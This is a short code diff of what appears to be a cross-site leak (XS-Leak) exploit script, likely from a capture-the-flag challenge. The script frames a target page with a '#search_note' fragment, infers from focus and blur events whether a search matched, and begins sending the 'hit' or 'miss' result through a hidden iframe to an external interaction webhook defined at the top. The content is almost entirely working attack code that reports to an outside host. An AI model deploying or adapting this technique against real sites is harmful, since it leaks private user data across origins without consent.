@@ -4,15 +4,21 @@ const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 window.onload = function () {
     const urlParams = new URLSearchParams(window.location.search);
     const id = urlParams.get('id');
+
+    const input = document.createElement("input");
+    input.setAttribute("autofocus", "");
+    document.body.appendChild(input);
+
     let blurFired = false;
-    window.focus();
-    window.addEventListener("blur", () => { blurFired = true; });
+    input.addEventListener("blur", () => { blurFired = true; });
+
     const iframe = document.createElement("iframe");
     iframe.src = TARGET + id + "#search_note";
     document.body.appendChild(iframe);
+
     iframe.onload = () => {
         setTimeout(() => {
-            console.log(blurFired);
+            console.log("blurFired:", blurFired);
             const result = blurFired ? "hit" : "miss";
             const ex = document.createElement("iframe");
             ex.style.display = "none";
